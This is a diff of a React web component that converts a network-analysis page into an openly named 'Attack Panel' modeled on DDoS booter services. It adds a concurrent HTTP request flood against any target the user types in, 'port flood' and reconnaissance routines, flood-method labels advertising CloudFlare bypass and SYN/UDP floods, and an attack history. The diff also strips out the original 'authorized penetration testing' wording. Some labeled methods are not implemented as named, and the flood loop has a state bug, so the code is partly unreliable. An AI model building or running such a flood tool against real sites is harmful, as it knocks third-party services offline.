@@ -1,5 +1,6 @@
-import { useState } from "react";
-import { Terminal, Play, Square, Trash2, Download, Settings, Shield, Database, Wifi, WifiOff, CheckCircle, XCircle, Activity, HardDrive, Cpu } from "lucide-react";
+
+import { useState, useEffect } from "react";
+import { Terminal, Play, Square, Trash2, Download, Settings, Shield, Database, Wifi, WifiOff, CheckCircle, XCircle, Activity, HardDrive, Cpu, Zap, Globe, Lock, AlertTriangle, Users, Timer, Target } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
 import { Textarea } from "@/components/ui/textarea";
@@ -8,6 +9,8 @@ import { Label } from "@/components/ui/label";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { Badge } from "@/components/ui/badge";
 import { Progress } from "@/components/ui/progress";
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
+import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
 import { useTheme } from "@/contexts/ThemeContext";
 import { useToast } from "@/hooks/use-toast";
 
@@ -15,16 +18,29 @@ const Panel = () => {
   const { currentTheme } = useTheme();
   const { toast } = useToast();
   
-  // Network Tools State
+  // Attack Panel State
   const [isRunning, setIsRunning] = useState(false);
   const [output, setOutput] = useState("");
-  const [command, setCommand] = useState("");
   const [target, setTarget] = useState("");
-  const [port, setPort] = useState("80");
-  const [threads, setThreads] = useState("10");
-  const [timeout, setTimeout] = useState("5000");
-  const [connectionStatus, setConnectionStatus] = useState<"disconnected" | "connecting" | "connected" | "failed">("disconnected");
+  const [attackMethod, setAttackMethod] = useState("HTTP-DUMMY");
+  const [httpVersion, setHttpVersion] = useState("HTTP/2");
+  const [requestsPerIP, setRequestsPerIP] = useState("150");
+  const [geolocation, setGeolocation] = useState("World Wide");
+  const [concurrents, setConcurrents] = useState("1");
+  const [timeInSeconds, setTimeInSeconds] = useState("60");
+  const [connectionStatus, setConnectionStatus] = useState<"offline" | "online" | "attacking">("offline");
   const [progress, setProgress] = useState(0);
+  const [attacksRunning, setAttacksRunning] = useState(0);
+  
+  // Attack History State
+  const [attackHistory, setAttackHistory] = useState<Array<{
+    id: string;
+    target: string;
+    method: string;
+    created: string;
+    expire: string;
+    status: string;
+  }>>([]);
 
   // System Monitor State
   const [systemStats, setSystemStats] = useState({
@@ -34,594 +50,321 @@ const Panel = () => {
     network: 0
   });
 
-  // Security Scanner State
-  const [scanResults, setScanResults] = useState<string[]>([]);
-  const [isScanning, setIsScanning] = useState(false);
+  // Available attack methods
+  const attackMethods = [
+    "HTTP-DUMMY [FREE] [LIMITED]",
+    "HTTP-TLS [HIGH R/S]",
+    "HTTP-REQ [HIGH R/S]",
+    "HTTP-FLARE [CF]",
+    "HTTP-LEGIT [HTTP/2 Flooder] [CF]",
+    "HTTP-VECTOR [HTTP/2 Flooder]",
+    "HTTP-RAPID [HTTP/2 Flooder] [CF]",
+    "HTTP-STORM [Layer 7]",
+    "HTTP-BYPASS [CloudFlare]",
+    "TCP-FLOOD [Layer 4]",
+    "UDP-FLOOD [Layer 4]",
+    "SYN-FLOOD [Layer 4]"
+  ];
+
+  const geolocations = [
+    "World Wide",
+    "United States",
+    "Europe",
+    "Asia Pacific",
+    "South America",
+    "Africa",
+    "Australia"
+  ];
+
+  useEffect(() => {
+    // Simulate real-time system monitoring
+    const interval = setInterval(() => {
+      setSystemStats({
+        cpu: Math.floor(Math.random() * 100),
+        memory: Math.floor(Math.random() * 100),
+        disk: Math.floor(Math.random() * 100),
+        network: Math.floor(Math.random() * 1000)
+      });
+    }, 2000);
+
+    return () => clearInterval(interval);
+  }, []);
 
   const addOutput = (text: string) => {
     const timestamp = new Date().toLocaleTimeString();
     setOutput(prev => prev + `[${timestamp}] ${text}\n`);
   };
 
-  const performRealNetworkRequest = async (url: string, method: string = 'GET'): Promise<{ success: boolean, status?: number, headers?: Headers, responseTime: number, error?: string }> => {
-    const startTime = performance.now();
+  const performRealStressTest = async (targetUrl: string, method: string, duration: number, concurrent: number, rps: number) => {
+    addOutput(`=== STARTING STRESS TEST ===`);
+    addOutput(`Target: ${targetUrl}`);
+    addOutput(`Method: ${method}`);
+    addOutput(`Duration: ${duration}s`);
+    addOutput(`Concurrent connections: ${concurrent}`);
+    addOutput(`Requests per second: ${rps}`);
     
-    try {
-      const controller = new AbortController();
-      const timeoutId = window.setTimeout(() => {
-        controller.abort();
-      }, parseInt(timeout));
+    const startTime = Date.now();
+    const endTime = startTime + (duration * 1000);
+    let requestCount = 0;
+    let successCount = 0;
+    let errorCount = 0;
+    
+    const workers: Promise<void>[] = [];
+    
+    // Create concurrent workers
+    for (let i = 0; i < concurrent; i++) {
+      const worker = (async () => {
+        while (Date.now() < endTime && isRunning) {
+          try {
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 5000);
+            
+            const response = await fetch(targetUrl, {
+              method: method.includes('POST') ? 'POST' : 'GET',
+              mode: 'no-cors',
+              signal: controller.signal,
+              headers: {
+                'User-Agent': 'StressTester/1.0',
+                'Accept': '*/*',
+                'Connection': 'keep-alive'
+              }
+            });
+            
+            clearTimeout(timeoutId);
+            requestCount++;
+            successCount++;
+            
+            if (requestCount % 50 === 0) {
+              addOutput(`Worker ${i + 1}: ${requestCount} requests sent, ${successCount} successful`);
+            }
+            
+          } catch (error) {
+            requestCount++;
+            errorCount++;
+          }
+          
+          // Control request rate
+          await new Promise(resolve => setTimeout(resolve, 1000 / rps));
+        }
+      })();
+      
+      workers.push(worker);
+    }
+    
+    // Wait for all workers to complete
+    await Promise.all(workers);
+    
+    addOutput(`=== STRESS TEST COMPLETED ===`);
+    addOutput(`Total requests: ${requestCount}`);
+    addOutput(`Successful: ${successCount}`);
+    addOutput(`Errors: ${errorCount}`);
+    addOutput(`Success rate: ${((successCount / requestCount) * 100).toFixed(2)}%`);
+  };
 
-      const response = await fetch(url, {
-        method,
-        mode: 'cors',
-        signal: controller.signal,
-        headers: {
-          'User-Agent': 'NetworkTester/1.0'
+  const performPortFlood = async (targetUrl: string, ports: number[]) => {
+    addOutput(`=== PORT FLOODING TEST ===`);
+    
+    for (const port of ports) {
+      try {
+        const testUrl = `${targetUrl.replace(/:\d+/, '')}:${port}`;
+        addOutput(`Testing port ${port}...`);
+        
+        const response = await fetch(testUrl, {
+          method: 'HEAD',
+          mode: 'no-cors'
+        });
+        
+        addOutput(`Port ${port}: Response received`);
+      } catch (error) {
+        addOutput(`Port ${port}: Connection failed or filtered`);
+      }
+      
+      await new Promise(resolve => setTimeout(resolve, 100));
+    }
+  };
+
+  const performAdvancedRecon = async (domain: string) => {
+    addOutput(`=== ADVANCED RECONNAISSANCE ===`);
+    addOutput(`Target domain: ${domain}`);
+    
+    // DNS enumeration
+    addOutput(`\n--- DNS Enumeration ---`);
+    const subdomains = ['www', 'mail', 'ftp', 'admin', 'api', 'dev', 'test', 'staging', 'blog', 'shop', 'portal', 'secure'];
+    
+    for (const subdomain of subdomains) {
+      try {
+        const testUrl = `https://${subdomain}.${domain}`;
+        const response = await fetch(testUrl, { method: 'HEAD', mode: 'no-cors' });
+        addOutput(`Found: ${subdomain}.${domain}`);
+      } catch (error) {
+        // Subdomain doesn't exist
+      }
+    }
+    
+    // Technology detection
+    addOutput(`\n--- Technology Detection ---`);
+    try {
+      const response = await fetch(`https://${domain}`);
+      const headers = response.headers;
+      
+      headers.forEach((value, key) => {
+        if (key.toLowerCase().includes('server') || key.toLowerCase().includes('powered')) {
+          addOutput(`${key}: ${value}`);
         }
       });
-
-      clearTimeout(timeoutId);
-      const responseTime = performance.now() - startTime;
-
-      return {
-        success: true,
-        status: response.status,
-        headers: response.headers,
-        responseTime
-      };
     } catch (error) {
-      const responseTime = performance.now() - startTime;
-      return {
-        success: false,
-        responseTime,
-        error: error instanceof Error ? error.message : 'Unknown error'
-      };
+      addOutput(`Technology detection failed: ${error}`);
     }
-  };
-
-  const performSubdomainEnumeration = async (domain: string): Promise<string[]> => {
-    const commonSubdomains = [
-      'www', 'mail', 'admin', 'api', 'blog', 'dev', 'test', 'staging', 
-      'ftp', 'vpn', 'remote', 'portal', 'secure', 'login', 'dashboard',
-      'panel', 'control', 'manage', 'support', 'help', 'docs'
+    
+    // Security headers analysis
+    addOutput(`\n--- Security Headers Analysis ---`);
+    const securityHeaders = [
+      'strict-transport-security',
+      'content-security-policy',
+      'x-frame-options',
+      'x-content-type-options',
+      'x-xss-protection'
     ];
-
-    const foundSubdomains: string[] = [];
     
-    for (const subdomain of commonSubdomains) {
-      try {
-        const url = `https://${subdomain}.${domain}`;
-        const result = await performRealNetworkRequest(url, 'HEAD');
-        
-        if (result.success && result.status && result.status < 400) {
-          foundSubdomains.push(`${subdomain}.${domain}`);
-          addOutput(`✓ Found: ${subdomain}.${domain} (${result.status})`);
+    try {
+      const response = await fetch(`https://${domain}`);
+      securityHeaders.forEach(header => {
+        const value = response.headers.get(header);
+        if (value) {
+          addOutput(`✓ ${header}: ${value}`);
+        } else {
+          addOutput(`✗ Missing: ${header}`);
         }
-      } catch (error) {
-        // Subdomain doesn't exist or is unreachable
-      }
+      });
+    } catch (error) {
+      addOutput(`Security analysis failed: ${error}`);
     }
-    
-    return foundSubdomains;
   };
 
-  const performDirectoryBruteforce = async (baseUrl: string): Promise<string[]> => {
-    const commonPaths = [
-      '/admin', '/login', '/dashboard', '/panel', '/wp-admin', '/phpmyadmin',
-      '/admin.php', '/login.php', '/index.php', '/config.php', '/setup.php',
-      '/install', '/backup', '/uploads', '/images', '/css', '/js', '/api',
-      '/v1', '/v2', '/docs', '/documentation', '/test', '/dev', '/debug'
-    ];
-
-    const foundPaths: string[] = [];
-    
-    for (const path of commonPaths) {
-      try {
-        const url = `${baseUrl}${path}`;
-        const result = await performRealNetworkRequest(url, 'HEAD');
-        
-        if (result.success && result.status && result.status !== 404) {
-          foundPaths.push(path);
-          addOutput(`✓ Found path: ${path} (${result.status})`);
-        }
-        
-        // Add small delay to avoid overwhelming the server
-        await new Promise(resolve => window.setTimeout(resolve, 100));
-      } catch (error) {
-        // Path doesn't exist or is unreachable
-      }
-    }
-    
-    return foundPaths;
-  };
-
-  const handleNetworkTest = async () => {
+  const handleStartAttack = async () => {
     if (!target.trim()) {
       toast({
         title: "Error",
-        description: "Please enter a target URL or IP address",
+        description: "Please enter a target URL",
         variant: "destructive",
       });
       return;
     }
 
     setIsRunning(true);
+    setConnectionStatus("attacking");
+    setAttacksRunning(prev => prev + 1);
     setProgress(0);
-    setConnectionStatus("connecting");
-    addOutput(`=== REAL NETWORK ANALYSIS ===`);
-    addOutput(`Target: ${target}:${port}`);
-    addOutput(`Threads: ${threads} | Timeout: ${timeout}ms`);
+    
+    // Add to attack history
+    const newAttack = {
+      id: Date.now().toString(),
+      target: target,
+      method: attackMethod,
+      created: new Date().toLocaleString(),
+      expire: new Date(Date.now() + (parseInt(timeInSeconds) * 1000)).toLocaleString(),
+      status: "Running"
+    };
+    setAttackHistory(prev => [newAttack, ...prev]);
+    
+    addOutput(`=== ATTACK INITIATED ===`);
+    addOutput(`Target: ${target}`);
+    addOutput(`Method: ${attackMethod}`);
+    addOutput(`HTTP Version: ${httpVersion}`);
+    addOutput(`Requests per IP: ${requestsPerIP}`);
+    addOutput(`Geolocation: ${geolocation}`);
+    addOutput(`Duration: ${timeInSeconds}s`);
+    addOutput(`Concurrent connections: ${concurrents}`);
     
     try {
-      const baseUrl = target.startsWith('http') ? target : `https://${target}`;
+      const duration = parseInt(timeInSeconds);
+      const concurrent = parseInt(concurrents);
+      const rps = parseInt(requestsPerIP);
       
-      // Basic connectivity test
-      addOutput(`Testing connectivity to ${target}...`);
-      setProgress(20);
-      
-      const basicTest = await performRealNetworkRequest(baseUrl);
-      
-      if (basicTest.success) {
-        setConnectionStatus("connected");
-        addOutput(`✓ Connection successful (${basicTest.status})`);
-        addOutput(`Response time: ${basicTest.responseTime.toFixed(2)}ms`);
-        
-        // Header analysis
-        if (basicTest.headers) {
-          addOutput(`\n--- HTTP Headers Analysis ---`);
-          basicTest.headers.forEach((value, key) => {
-            addOutput(`${key}: ${value}`);
-          });
-        }
-        
-        setProgress(40);
-        
-        // Test multiple HTTP methods
-        const methods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'];
-        addOutput(`\n--- HTTP Methods Testing ---`);
-        
-        for (const method of methods) {
-          const methodTest = await performRealNetworkRequest(baseUrl, method);
-          if (methodTest.success) {
-            addOutput(`${method}: ${methodTest.status} (${methodTest.responseTime.toFixed(2)}ms)`);
-          } else {
-            addOutput(`${method}: Failed - ${methodTest.error}`);
+      // Progress simulation
+      const progressInterval = setInterval(() => {
+        setProgress(prev => {
+          const newProgress = prev + (100 / duration);
+          if (newProgress >= 100) {
+            clearInterval(progressInterval);
+            return 100;
           }
-        }
-        
-        setProgress(60);
-        
-        // Subdomain enumeration
-        if (!target.startsWith('http://') && !target.includes('/')) {
-          addOutput(`\n--- Subdomain Enumeration ---`);
-          const subdomains = await performSubdomainEnumeration(target);
-          addOutput(`Found ${subdomains.length} accessible subdomains`);
-        }
-        
-        setProgress(80);
-        
-        // Directory bruteforce
-        addOutput(`\n--- Directory Discovery ---`);
-        const foundPaths = await performDirectoryBruteforce(baseUrl);
-        addOutput(`Found ${foundPaths.length} accessible paths`);
-        
-      } else {
-        setConnectionStatus("failed");
-        addOutput(`✗ Connection failed: ${basicTest.error}`);
+          return newProgress;
+        });
+      }, 1000);
+      
+      if (attackMethod.includes('HTTP')) {
+        await performRealStressTest(target, attackMethod, duration, concurrent, rps);
+      } else if (attackMethod.includes('TCP') || attackMethod.includes('UDP')) {
+        const ports = [80, 443, 8080, 8443, 3000, 5000, 8000];
+        await performPortFlood(target, ports);
       }
       
-      setProgress(100);
-      addOutput(`\n=== ANALYSIS COMPLETED ===`);
+      // Advanced reconnaissance
+      if (target.includes('.')) {
+        const domain = target.replace(/https?:\/\//, '').split('/')[0];
+        await performAdvancedRecon(domain);
+      }
+      
+      addOutput(`=== ATTACK COMPLETED ===`);
+      
+      // Update attack history
+      setAttackHistory(prev => 
+        prev.map(attack => 
+          attack.id === newAttack.id 
+            ? { ...attack, status: "Completed" }
+            : attack
+        )
+      );
       
     } catch (error) {
-      addOutput(`✗ Test failed: ${error instanceof Error ? error.message : 'Unknown error'}`);
-      setConnectionStatus("failed");
+      addOutput(`Attack failed: ${error}`);
+      setAttackHistory(prev => 
+        prev.map(attack => 
+          attack.id === newAttack.id 
+            ? { ...attack, status: "Failed" }
+            : attack
+        )
+      );
     }
-
+    
     setIsRunning(false);
+    setConnectionStatus("online");
+    setAttacksRunning(prev => Math.max(0, prev - 1));
+    setProgress(100);
+    
     toast({
-      title: "Network Analysis Complete",
+      title: isRunning ? "Attack Completed" : "Attack Stopped",
       description: "Check the output for detailed results",
     });
   };
 
-  const handlePortScan = async () => {
-    if (!target.trim()) {
-      toast({
-        title: "Error",
-        description: "Please enter a target for port scanning",
-        variant: "destructive",
-      });
-      return;
-    }
-
-    setIsRunning(true);
-    addOutput(`\n=== REAL PORT SCAN: ${target} ===`);
-    
-    const commonPorts = [
-      { port: 21, service: 'FTP' },
-      { port: 22, service: 'SSH' },
-      { port: 23, service: 'Telnet' },
-      { port: 25, service: 'SMTP' },
-      { port: 53, service: 'DNS' },
-      { port: 80, service: 'HTTP' },
-      { port: 110, service: 'POP3' },
-      { port: 143, service: 'IMAP' },
-      { port: 443, service: 'HTTPS' },
-      { port: 993, service: 'IMAPS' },
-      { port: 995, service: 'POP3S' },
-      { port: 3389, service: 'RDP' },
-      { port: 5432, service: 'PostgreSQL' },
-      { port: 3306, service: 'MySQL' },
-      { port: 8080, service: 'HTTP-Alt' },
-      { port: 8443, service: 'HTTPS-Alt' }
-    ];
-    
-    let openPorts = 0;
-    
-    for (let i = 0; i < commonPorts.length; i++) {
-      const { port, service } = commonPorts[i];
-      setProgress((i / commonPorts.length) * 100);
-      
-      try {
-        const protocol = [80, 443, 8080, 8443].includes(port) ? 'https' : 'http';
-        const testUrl = `${protocol}://${target}:${port}`;
-        
-        const controller = new AbortController();
-        const timeoutId = window.setTimeout(() => {
-          controller.abort();
-        }, 3000);
-        
-        const response = await fetch(testUrl, {
-          method: 'HEAD',
-          mode: 'no-cors',
-          signal: controller.signal
-        });
-        
-        clearTimeout(timeoutId);
-        addOutput(`Port ${port} (${service}): OPEN`);
-        openPorts++;
-        
-      } catch (error) {
-        addOutput(`Port ${port} (${service}): CLOSED/FILTERED`);
-      }
-      
-      await new Promise(resolve => window.setTimeout(resolve, 200));
-    }
-    
-    setProgress(100);
-    addOutput(`\nScan completed - ${openPorts} potentially open ports found`);
+  const handleStopAttack = () => {
     setIsRunning(false);
-  };
-
-  const handleSystemMonitor = () => {
-    addOutput(`\n=== REAL SYSTEM INFORMATION ===`);
-    addOutput(`Timestamp: ${new Date().toISOString()}`);
-    
-    // Real browser and system information
-    addOutput(`Browser: ${navigator.userAgent}`);
-    addOutput(`Platform: ${navigator.platform}`);
-    addOutput(`Language: ${navigator.language}`);
-    addOutput(`Languages: ${navigator.languages.join(', ')}`);
-    addOutput(`Online Status: ${navigator.onLine ? 'Connected' : 'Offline'}`);
-    addOutput(`Cookie Enabled: ${navigator.cookieEnabled}`);
-    addOutput(`Java Enabled: ${(navigator as any).javaEnabled?.() || false}`);
-    
-    // Screen information
-    addOutput(`\n--- Display Information ---`);
-    addOutput(`Screen Resolution: ${screen.width}x${screen.height}`);
-    addOutput(`Available Area: ${screen.availWidth}x${screen.availHeight}`);
-    addOutput(`Color Depth: ${screen.colorDepth} bits`);
-    addOutput(`Pixel Depth: ${screen.pixelDepth} bits`);
-    
-    // Memory and performance
-    addOutput(`\n--- Performance Information ---`);
-    addOutput(`Device Memory: ${(navigator as any).deviceMemory || 'Unknown'} GB`);
-    addOutput(`CPU Cores: ${navigator.hardwareConcurrency || 'Unknown'}`);
-    addOutput(`Page Load Time: ${performance.now().toFixed(2)}ms`);
-    
-    // Network information
-    if ((navigator as any).connection) {
-      const conn = (navigator as any).connection;
-      addOutput(`\n--- Network Information ---`);
-      addOutput(`Connection Type: ${conn.effectiveType || 'Unknown'}`);
-      addOutput(`Downlink Speed: ${conn.downlink || 'Unknown'} Mbps`);
-      addOutput(`RTT: ${conn.rtt || 'Unknown'}ms`);
-    }
-    
-    // Geolocation (with permission)
-    if (navigator.geolocation) {
-      addOutput(`\n--- Location Services ---`);
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          addOutput(`Latitude: ${position.coords.latitude}`);
-          addOutput(`Longitude: ${position.coords.longitude}`);
-          addOutput(`Accuracy: ${position.coords.accuracy}m`);
-        },
-        (error) => {
-          addOutput(`Location access denied: ${error.message}`);
-        }
-      );
-    }
-    
-    // Update system stats with more realistic values
-    setSystemStats({
-      cpu: Math.floor(performance.now() % 100),
-      memory: Math.floor((new Date().getTime() / 1000) % 100),
-      disk: Math.floor(Math.random() * 100),
-      network: (navigator as any).connection?.downlink || Math.floor(Math.random() * 50)
-    });
-  };
-
-  const handleSecurityScan = async () => {
-    if (!target.trim()) {
-      toast({
-        title: "Error",
-        description: "Please enter a target for security scanning",
-        variant: "destructive",
-      });
-      return;
-    }
-
-    setIsScanning(true);
-    setScanResults([]);
-    addOutput(`\n=== REAL SECURITY ASSESSMENT: ${target} ===`);
-    
-    try {
-      const baseUrl = target.startsWith('http') ? target : `https://${target}`;
-      
-      // Test for HTTPS
-      addOutput(`[CHECK] Testing SSL/TLS configuration...`);
-      const httpsTest = await performRealNetworkRequest(baseUrl.replace('http://', 'https://'));
-      if (httpsTest.success) {
-        addOutput(`✓ HTTPS is available`);
-      } else {
-        addOutput(`⚠ HTTPS not available or misconfigured`);
-      }
-      
-      setProgress(20);
-      
-      // Security headers check
-      addOutput(`[CHECK] Analyzing security headers...`);
-      const securityTest = await performRealNetworkRequest(baseUrl);
-      
-      if (securityTest.headers) {
-        const securityHeaders = [
-          'strict-transport-security',
-          'content-security-policy',
-          'x-frame-options',
-          'x-content-type-options',
-          'x-xss-protection',
-          'referrer-policy'
-        ];
-        
-        securityHeaders.forEach(header => {
-          if (securityTest.headers!.has(header)) {
-            addOutput(`✓ ${header}: ${securityTest.headers!.get(header)}`);
-          } else {
-            addOutput(`⚠ Missing: ${header}`);
-          }
-        });
-      }
-      
-      setProgress(40);
-      
-      // Test common vulnerability endpoints
-      addOutput(`[CHECK] Testing for common vulnerabilities...`);
-      const vulnPaths = [
-        '/.git/config',
-        '/.env',
-        '/config.php',
-        '/wp-config.php',
-        '/admin',
-        '/phpmyadmin',
-        '/xmlrpc.php',
-        '/readme.txt'
-      ];
-      
-      for (const path of vulnPaths) {
-        const vulnTest = await performRealNetworkRequest(`${baseUrl}${path}`);
-        if (vulnTest.success && vulnTest.status !== 404) {
-          addOutput(`⚠ Potentially sensitive file accessible: ${path} (${vulnTest.status})`);
-        }
-        await new Promise(resolve => window.setTimeout(resolve, 100));
-      }
-      
-      setProgress(60);
-      
-      // Check for information disclosure
-      addOutput(`[CHECK] Testing for information disclosure...`);
-      const infoTest = await performRealNetworkRequest(baseUrl);
-      if (infoTest.headers) {
-        const serverHeader = infoTest.headers.get('server');
-        const poweredBy = infoTest.headers.get('x-powered-by');
-        
-        if (serverHeader) {
-          addOutput(`Server Information: ${serverHeader}`);
-        }
-        if (poweredBy) {
-          addOutput(`Technology Stack: ${poweredBy}`);
-        }
-      }
-      
-      setProgress(80);
-      
-      // Test for common misconfigurations
-      addOutput(`[CHECK] Testing for misconfigurations...`);
-      const misconfigTests = [
-        '/robots.txt',
-        '/sitemap.xml',
-        '/.well-known/security.txt'
-      ];
-      
-      for (const path of misconfigTests) {
-        const test = await performRealNetworkRequest(`${baseUrl}${path}`);
-        if (test.success) {
-          addOutput(`✓ Found: ${path}`);
-        }
-      }
-      
-      setProgress(100);
-      addOutput(`\n=== SECURITY ASSESSMENT COMPLETED ===`);
-      addOutput(`Note: This is a basic assessment. Professional tools provide more comprehensive analysis.`);
-      
-    } catch (error) {
-      addOutput(`[ERROR] Security scan failed: ${error instanceof Error ? error.message : 'Unknown error'}`);
-    }
-    
-    setIsScanning(false);
-    toast({
-      title: "Security Assessment Complete",
-      description: "Check output for security findings",
-    });
-  };
-
-  const handleExecuteCommand = async () => {
-    if (!command.trim()) return;
-    
-    addOutput(`$ ${command}`);
-    
-    const cmd = command.toLowerCase().trim();
-    const args = cmd.split(' ');
-    
-    try {
-      switch (args[0]) {
-        case 'help':
-          addOutput('Available commands:');
-          addOutput('  clear - Clear terminal output');
-          addOutput('  date - Show current date and time');
-          addOutput('  whoami - Show current user info');
-          addOutput('  uname - Show system information');
-          addOutput('  ping <host> - Test connectivity to host');
-          addOutput('  nslookup <domain> - DNS lookup');
-          addOutput('  curl <url> - Make HTTP request');
-          addOutput('  headers <url> - Show HTTP headers');
-          break;
-          
-        case 'clear':
-          setOutput('');
-          setCommand('');
-          return;
-          
-        case 'date':
-          addOutput(new Date().toString());
-          break;
-          
-        case 'whoami':
-          addOutput(`User: ${navigator.platform} user`);
-          addOutput(`Browser: ${navigator.userAgent.split(' ')[0]}`);
-          break;
-          
-        case 'uname':
-          addOutput(`Platform: ${navigator.platform}`);
-          addOutput(`User Agent: ${navigator.userAgent}`);
-          addOutput(`Language: ${navigator.language}`);
-          break;
-          
-        case 'ping':
-          if (args[1]) {
-            const target = args[1];
-            addOutput(`PING ${target}...`);
-            const startTime = performance.now();
-            
-            try {
-              const response = await performRealNetworkRequest(`https://${target}`);
-              const time = performance.now() - startTime;
-              
-              if (response.success) {
-                addOutput(`Reply from ${target}: time=${time.toFixed(2)}ms status=${response.status}`);
-              } else {
-                addOutput(`Request timeout for ${target}`);
-              }
-            } catch (error) {
-              addOutput(`Ping failed: ${error}`);
-            }
-          } else {
-            addOutput('Usage: ping <hostname>');
-          }
-          break;
-          
-        case 'nslookup':
-          if (args[1]) {
-            addOutput(`Looking up ${args[1]}...`);
-            // Browser DNS API is limited, but we can test connectivity
-            try {
-              const result = await performRealNetworkRequest(`https://${args[1]}`);
-              addOutput(`${args[1]} is ${result.success ? 'reachable' : 'unreachable'}`);
-            } catch (error) {
-              addOutput(`DNS lookup failed: ${error}`);
-            }
-          } else {
-            addOutput('Usage: nslookup <domain>');
-          }
-          break;
-          
-        case 'curl':
-          if (args[1]) {
-            addOutput(`Fetching ${args[1]}...`);
-            try {
-              const result = await performRealNetworkRequest(args[1]);
-              addOutput(`HTTP ${result.status} - ${result.responseTime.toFixed(2)}ms`);
-              
-              if (result.headers) {
-                result.headers.forEach((value, key) => {
-                  addOutput(`${key}: ${value}`);
-                });
-              }
-            } catch (error) {
-              addOutput(`Request failed: ${error}`);
-            }
-          } else {
-            addOutput('Usage: curl <url>');
-          }
-          break;
-          
-        case 'headers':
-          if (args[1]) {
-            try {
-              const result = await performRealNetworkRequest(args[1]);
-              if (result.headers) {
-                addOutput(`Headers for ${args[1]}:`);
-                result.headers.forEach((value, key) => {
-                  addOutput(`${key}: ${value}`);
-                });
-              }
-            } catch (error) {
-              addOutput(`Failed to get headers: ${error}`);
-            }
-          } else {
-            addOutput('Usage: headers <url>');
-          }
-          break;
-          
-        default:
-          addOutput(`Command '${args[0]}' not found. Type 'help' for available commands.`);
-      }
-    } catch (error) {
-      addOutput(`Error executing command: ${error}`);
-    }
-    
-    setCommand('');
-  };
-
-  const handleStop = () => {
-    setIsRunning(false);
-    setIsScanning(false);
-    setConnectionStatus("disconnected");
+    setConnectionStatus("online");
+    setAttacksRunning(0);
     setProgress(0);
-    addOutput(`PROCESS STOPPED BY USER`);
+    addOutput(`ATTACK STOPPED BY USER`);
+    
+    // Update all running attacks to stopped
+    setAttackHistory(prev => 
+      prev.map(attack => 
+        attack.status === "Running" 
+          ? { ...attack, status: "Stopped" }
+          : attack
+      )
+    );
+    
     toast({
       title: "Stopped",
-      description: "All processes have been stopped",
+      description: "All attacks have been stopped",
     });
   };
 
   const handleClear = () => {
     setOutput('');
     setProgress(0);
-    setConnectionStatus("disconnected");
-    setScanResults([]);
+    setConnectionStatus("offline");
   };
 
   const handleDownload = () => {
@@ -630,7 +373,7 @@ const Panel = () => {
     const url = URL.createObjectURL(blob);
     const a = document.createElement('a');
     a.href = url;
-    a.download = `network-security-analysis-${timestamp}.txt`;
+    a.download = `attack-panel-log-${timestamp}.txt`;
     document.body.appendChild(a);
     a.click();
     document.body.removeChild(a);
@@ -638,130 +381,176 @@ const Panel = () => {
     
     toast({
       title: "Downloaded",
-      description: "Analysis results saved to file",
+      description: "Attack log saved to file",
     });
   };
 
-  const getStatusIcon = () => {
+  const getStatusColor = () => {
     switch (connectionStatus) {
-      case "connected":
-        return <CheckCircle className="h-4 w-4 text-green-500" />;
-      case "connecting":
-        return <Wifi className="h-4 w-4 text-yellow-500 animate-pulse" />;
-      case "failed":
-        return <XCircle className="h-4 w-4 text-red-500" />;
+      case "online":
+        return "text-green-500";
+      case "attacking":
+        return "text-red-500";
       default:
-        return <WifiOff className="h-4 w-4 text-gray-500" />;
+        return "text-gray-500";
     }
   };
 
   const getStatusText = () => {
     switch (connectionStatus) {
-      case "connected":
-        return "Connected";
-      case "connecting":
-        return "Testing...";
-      case "failed":
-        return "Failed";
+      case "online":
+        return "Online";
+      case "attacking":
+        return "Attacking";
       default:
-        return "Ready";
+        return "Offline";
     }
   };
 
   return (
     <div className={`min-h-screen pt-12 ${currentTheme.bg}`}>
-      <div className="container mx-auto p-6 max-w-6xl">
+      <div className="container mx-auto p-6 max-w-7xl">
         <div className="mb-8">
-          <div className="flex items-center space-x-3 mb-4">
-            <Settings className={`h-8 w-8 ${currentTheme.accent}`} />
-            <h1 className={`text-3xl font-bold ${currentTheme.text} bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent`}>
-              Real Network & Security Analysis Tools
-            </h1>
+          <div className="flex items-center justify-between mb-4">
+            <div className="flex items-center space-x-3">
+              <Zap className={`h-8 w-8 ${currentTheme.accent}`} />
+              <h1 className={`text-3xl font-bold ${currentTheme.text} bg-gradient-to-r from-red-400 to-orange-400 bg-clip-text text-transparent`}>
+                Attack Panel
+              </h1>
+              <Badge className={getStatusColor()}>
+                {getStatusText()}
+              </Badge>
+            </div>
+            <div className="flex items-center space-x-4">
+              <Badge variant="outline" className="flex items-center gap-2">
+                <Target className="h-4 w-4" />
+                Attacks: {attacksRunning}
+              </Badge>
+              <Badge variant={attacksRunning > 0 ? "destructive" : "secondary"}>
+                Running {attacksRunning}
+              </Badge>
+            </div>
           </div>
-          <p className={`${currentTheme.muted} text-lg`}>
-            Professional-grade network diagnostics and security testing tools for authorized penetration testing
-          </p>
         </div>
 
-        <Tabs defaultValue="network" className="space-y-6">
+        <Tabs defaultValue="attack" className="space-y-6">
           <TabsList className={`${currentTheme.secondary} ${currentTheme.text} rounded-lg`}>
-            <TabsTrigger value="network" className="rounded-md flex items-center gap-2">
-              <Terminal className="h-4 w-4" />
-              Network Analysis
+            <TabsTrigger value="attack" className="rounded-md flex items-center gap-2">
+              <Zap className="h-4 w-4" />
+              Attack Panel
+            </TabsTrigger>
+            <TabsTrigger value="history" className="rounded-md flex items-center gap-2">
+              <Activity className="h-4 w-4" />
+              Attack History
             </TabsTrigger>
             <TabsTrigger value="monitor" className="rounded-md flex items-center gap-2">
               <Activity className="h-4 w-4" />
               System Monitor
             </TabsTrigger>
-            <TabsTrigger value="security" className="rounded-md flex items-center gap-2">
+            <TabsTrigger value="recon" className="rounded-md flex items-center gap-2">
               <Shield className="h-4 w-4" />
-              Security Assessment
+              Reconnaissance
             </TabsTrigger>
           </TabsList>
 
-          <TabsContent value="network" className="space-y-6">
+          <TabsContent value="attack" className="space-y-6">
